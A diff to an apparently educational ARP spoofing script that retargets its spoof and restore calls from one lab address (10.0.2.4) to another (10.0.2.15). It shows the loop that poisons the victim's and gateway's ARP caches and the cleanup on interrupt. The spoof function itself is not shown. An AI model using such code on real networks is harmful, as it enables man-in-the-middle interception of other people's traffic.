@@ -27,8 +27,8 @@ def restore(destination_ip, source_ip):
 try:
     sent_packets_count = 0
     while True:
-        spoof("10.0.2.4", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.4")
+        spoof("10.0.2.15", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.15")
         #print("[+] Send two packets")
         sent_packets_count += 2 
         #print("[+] Packets sent:" + str(sent_packets_count)),#print at the same line in the buffer -> will be printed until program quit(not work here? becasue it is just work in python2)
@@ -39,6 +39,6 @@ try:
 except KeyboardInterrupt:
     print()
     print("[+] Detected CTRL + C ...... Resetting ARP tables ...... Please wait.")
-    restore("10.0.2.4", "10.0.2.1")
-    restore("10.0.2.1", "10.0.2.4")
+    restore("10.0.2.15", "10.0.2.1")
+    restore("10.0.2.1", "10.0.2.15")
     print("[+] Reset ARP tables done.")
